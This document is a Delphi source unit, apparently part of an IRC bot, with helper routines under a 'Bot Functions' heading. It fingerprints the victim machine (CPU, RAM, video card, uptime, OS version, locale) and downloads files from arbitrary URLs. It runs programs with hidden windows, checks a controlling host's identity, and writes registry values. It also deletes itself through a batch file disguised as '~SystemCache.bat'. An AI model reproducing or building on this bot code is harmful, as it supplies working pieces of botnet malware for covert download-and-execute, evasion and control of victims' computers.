unit abFunctions;

interface
  uses Windows, WinInet, ShFolder;

//String Functions
function IntToStr(I: Integer): String;
function StrToInt(S: String): Integer;
function LowerCase(S: String): String;
function MatchStrings(Str1, Str2: String): Boolean;
function LeftStr(const AText: AnsiString; const ACount: Integer): AnsiString; overload;
function RightStr(const AText: AnsiString; const ACount: Integer): AnsiString; overload;
function TrimEx(S: String): String;
function Split(Input: String; Deliminator: String; Index: Integer): String;
function ReplaceString(S, OldPattern, NewPattern: String): String;
function WildcardCompare(WildS, IstS: String): Boolean;

//System Information Functions
function GetProcessorName(): String;
function GetTotalRAM(): String;
function GetVideoCard(): String;
function GetUptime(): String;
function GetAppDataPath(): String;
function GetWinVersion(): String;
function GetWinLang(): String;

//Bot Functions
function Download(const fileURL, FileName: String): Boolean;
function CheckAuthHost(AuthHost, RawData: String): Boolean;
procedure DeleteSelf(MyPath: String);
function FileExists(FileName: String): Boolean;
procedure ExecuteFile(Path: String);

//Registry Functions
procedure InsertRegValue(Root: HKey; Path, Value, Str: String);
function ReadRegValue(Root: HKey; Path, Value, Default: String): String;
procedure DeleteRegValue(Root: HKey; Path, Value: String);

implementation
//////////////////////////////////////////////////////////
//String Functions
//////////////////////////////////////////////////////////
function IntToStr(I: Integer): String;
begin
  Str(i, Result);
end;

function StrToInt(S: String): Integer;
begin
  Val(S, Result, Result);
end;

function LowerCase(S: String): String;
var
  I: Integer;
begin
  for I := 1 to Length(S) do S[I] := Char(CharLower(PChar(S[I])));
  Result := S;
end;

function MatchStrings(Str1, Str2: String): Boolean;
begin
 if LowerCase(Str1) = LowerCase(Str2) then Result := True else Result := False;
end;

function LeftStr(const AText: AnsiString; const ACount: Integer): AnsiString; overload;
begin
  Result := Copy(AText, 1, ACount);
end;

function RightStr(const AText: AnsiString; const ACount: Integer): AnsiString; overload;
begin
  Result := Copy(AText, Length(AText) - ACount + 1, Length(AText));
end;

function TrimEx(S: String): String;
var
  I, Count: Integer;
begin
  I := Length(S);
  Count:= 1;
  repeat
    if Copy(S, Count, 1) <> #0 then Result := Result + Copy(S, Count, 1);
    Inc(Count)
  until Count = I;
end;

function Split(Input: String; Deliminator: String; Index: Integer): String;
var
  StringLoop, StringCount: Integer;
  Buffer: String;
begin
  Buffer := '';
  if Index < 1 then Exit;
  StringCount := 0;
  StringLoop := 1;
  while (StringLoop <= Length(Input)) do
  begin
    if (Copy(Input, StringLoop, Length(Deliminator)) = Deliminator) then
    begin
      Inc(StringLoop, Length(Deliminator) - 1);
      Inc(StringCount);
      if StringCount = Index then
      begin
        Result := Buffer;
        Exit;
      end
      else
      begin
        Buffer := '';
      end;
    end
    else
    begin
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    end;
    Inc(StringLoop, 1);
  end;
  Inc(StringCount);
  if StringCount < Index then Buffer := '';
  Result := Buffer;
end;

function ReplaceString(S, OldPattern, NewPattern: String): String;
var
  SearchStr, Patt, NewStr: string;
  Offset: Integer;
begin
  SearchStr := S;
  Patt := OldPattern;
  NewStr := S;
  Result := '';
  while SearchStr <> '' do
  begin
    Offset := Pos(Patt, SearchStr);
    if Offset = 0 then
    begin
      Result := Result + NewStr;
      Break;
    end;
    Result := Result + Copy(NewStr, 1, Offset - 1) + NewPattern;
    NewStr := Copy(NewStr, Offset + Length(OldPattern), MaxInt);
    SearchStr := Copy(SearchStr, Offset + Length(Patt), MaxInt);
  end;
end;

function WildcardCompare(WildS, IstS: String): Boolean;
var
  I, J, L, P: Byte;
begin
  I := 1;
  J := 1;
  while (I <= Length(WildS)) do
  begin
    if WildS[I] = '*' then
    begin
      if I = Length(WildS) then
      begin
        Result := True;
        Exit
      end
      else
      begin
        L := I + 1;
        while (l < length(WildS)) and (WildS[l+1] <> '*') do Inc (l);
        P := Pos(Copy(WildS, I + 1, L - I), IstS);
        if P > 0 then J := P - 1
        else
        begin
          Result := False;
          Exit;
        end;
      end;
    end
    else
    if (WildS[I] <> '?') and ((Length(IstS) < I) or (WildS[I] <> IstS[J])) then
    begin
      Result := False;
 	    Exit
    end;
    Inc(I);
    Inc(J);
  end;
  Result := (J > Length(IstS));
end;

//////////////////////////////////////////////////////////
//System Information Functions
//////////////////////////////////////////////////////////
function GetProcessorName(): String;
const
  Size: Integer = 2048;
var
  Temp: HKEY;
  Speed: Integer;
begin
  RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 0, KEY_QUERY_VALUE, Temp);
  RegQueryValueEx(Temp, '~MHz', nil, nil, @Speed, @Size);
  RegCloseKey(Temp);
  Result := ReadRegValue(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString', 'Not Found') + ' - ' + IntToStr(Speed) + ' MHz';
end;

function GetTotalRAM(): String;
var
  MemoryStatus: TMemoryStatus;
begin
  MemoryStatus.dwLength := SizeOf(TMemoryStatus);
  GlobalMemoryStatus(MemoryStatus);
  Result := IntToStr(MemoryStatus.dwTotalPhys div 1048576) + 'MB';
end;

function GetVideoCard(): String;
var
  Device: TDisplayDevice;
  dwFlags, dwDevNum: DWORD;
  Return: String;
begin
  Return := 'Not Found';
  Device.cb := sizeof(Device);
  dwFlags := 0;
  dwDevNum := 0;
  EnumDisplayDevices(nil, dwDevNum, Device, dwFlags);
  Return := Device.DeviceString;
  Result := Return;
end;

function GetUptime(): String;
var
  Total: Integer;
begin
  Total := GetTickCount() div 1000;
  Result := IntToStr(Total DIV 86400) + 'd ' + IntToStr((Total MOD 86400) DIV 3600) + 'h ' + IntToStr(((Total MOD 86400) MOD 3600) DIV 60) + 'm ' + IntToStr((((Total MOD 86400) MOD 3600) MOD 60) DIV 1) + 's';
end;

function GetAppDataPath() : String;
var
  SHGetFolderPath :TSHGetFolderPath;
  hFolderDLL : THandle;
var
  Buf: array[0..256] of Char;
begin
  hFolderDLL := LoadLibrary('SHFolder.dll');
  try
    SHGetFolderPath := nil;
    if hFolderDLL <> 0 then @SHGetFolderPath := GetProcAddress(hFolderDLL, 'SHGetFolderPathA');
    if Assigned(SHGetFolderPath) and (S_OK = SHGetFolderPath(0, CSIDL_APPDATA or CSIDL_FLAG_CREATE, 0, 0, Buf)) then
    else
    GetTempPath(Max_path, Buf);
  finally
    if hFolderDLL <> 0 then FreeLibrary(hFolderDLL);
    Result := String(Buf) + '\';
  end;
end;

function GetWinVersion(): String;
var
  osVerInfo: TOSVersionInfo;
  majorVersion, minorVersion: Integer;
begin
  Result := 'Unknown';
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo) ;
  if GetVersionEx(osVerInfo) then
  begin
    minorVersion := osVerInfo.dwMinorVersion;
    majorVersion := osVerInfo.dwMajorVersion;
    case osVerInfo.dwPlatformId of VER_PLATFORM_WIN32_NT:
    begin
      if majorVersion <= 4 then Result := 'WinNT'
      else if (majorVersion = 5) and (minorVersion = 0) then Result := 'Win2000'
      else if (majorVersion = 5) and (minorVersion = 1) then Result := 'WinXP'
      else if (majorVersion = 5) and (minorVersion = 2) then Result := 'Win2003'
      else if (majorVersion = 6) then Result := 'WinVista';
    end;
    VER_PLATFORM_WIN32_WINDOWS:
    begin
    if (majorVersion = 4) and (minorVersion = 0) then Result := 'Win95'
      else if (majorVersion = 4) and (minorVersion = 10) then
      begin
          if osVerInfo.szCSDVersion[1] = 'A' then Result := 'Win98SE'
        else
          Result := 'Win98';
        end
      else if (majorVersion = 4) and (minorVersion = 90) then Result := 'WinME' else Result := 'Unknown';
      end;
    end;
  end;
end;

function GetWinLang(): String;
var
 Buffer: PChar;
 Size: Integer;
begin
 Size := GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, nil, 0);
 GetMem(Buffer, Size);
 try
  GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, Buffer, Size);
  Result := String(Buffer);
 finally
  FreeMem(Buffer);
 end;
end;

//////////////////////////////////////////////////////////
//Bot Functions
//////////////////////////////////////////////////////////
function Download(const fileURL, FileName: String): Boolean;
const BufferSize = 1024;
var
  hSession, hURL: HInternet;
  Buffer: array[1..BufferSize] of Byte;
  BufferLen: DWord;
  f: File;
begin
  Result := False;
  hSession := InternetOpen(PChar('explorer'), INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
  try
    hURL := InternetOpenURL(hSession, PChar(fileURL), nil, 0, 0, 0);
    try
      AssignFile(f, FileName);
      Rewrite(f,1);
      repeat
        InternetReadFile(hURL, @Buffer, SizeOf(Buffer), BufferLen);
        BlockWrite(f, Buffer, BufferLen)
      until BufferLen = 0;
      CloseFile(f);
      Result := True;
    finally
      InternetCloseHandle(hURL)
    end
  finally
    InternetCloseHandle(hSession)
  end
end;

function CheckAuthHost(AuthHost, RawData: String): Boolean;
begin
  Delete(RawData, 1, 1);
  RawData := Copy(RawData, 1, Pos(' ', RawData));
  if WildcardCompare(AuthHost, TrimEx(RawData)) then Result := True else Result := False;
end;

procedure DeleteSelf(MyPath: String);
var
  BatchFile: TextFile;
begin
  AssignFile(BatchFile, GetAppDataPath + '~SystemCache.bat');
  ReWrite(BatchFile);
    WriteLn(BatchFile, ':try');
    WriteLn(BatchFile, 'del "' + MyPath + '"');
    WriteLn(BatchFile, 'if exist "' + MyPath + '" goto try');
    WriteLn(BatchFile, 'del "' + GetAppDataPath + '~SystemCache.bat"' );
  CloseFile(BatchFile);
  ExecuteFile(GetAppDataPath + '~SystemCache.bat');
end;

function FileExists(FileName: String): Boolean;
var
  hFile: THandle;
  lpFindFileData: TWin32FindData;
begin
  Result := False;
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    FindClose(hFile);
    Result := True;
  end;
end;

procedure ExecuteFile(Path: String);
var
  PI: TProcessInformation;
  SI: TStartupInfo;
begin
  FillChar(SI, SizeOf(SI), $00);
  SI.dwFlags := STARTF_USESHOWWINDOW;
  SI.wShowWindow := SW_HIDE;
  if CreateProcess(nil, PChar(Path), nil, nil, False, IDLE_PRIORITY_CLASS, nil, nil, SI, PI) then
  begin
    CloseHandle(PI.hThread);
    CloseHandle(PI.hProcess);
  end;
end;

//////////////////////////////////////////////////////////
//Registry Functions
//////////////////////////////////////////////////////////
procedure InsertRegValue(Root: HKey; Path, Value, Str: String);
var
  Key: HKey;
  Size: Cardinal;
begin
  RegOpenKey(Root, PChar(Path), Key);
  Size := Length(Str);
  RegSetValueEx(Key, PChar(Value), 0, REG_SZ, @Str[1], Size);
  RegCloseKey(Key);
end;

function ReadRegValue(Root: HKey; Path, Value, Default: String): String;
var
  Key: HKey;
  RegType: Integer;
  DataSize: Integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Root, PChar(Path), 0, KEY_ALL_ACCESS, Key) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Key, PChar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Key, PChar(Value), nil, @RegType, PByte(PChar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Key);
  end;
end;

procedure DeleteRegValue(Root: HKey; Path, Value: String);
var
  Key: HKey;
begin
  RegOpenKey(ROOT, PChar(Path), Key);
  RegDeleteValue(Key, PChar(Value));
  RegCloseKey(Key);
end;

end.
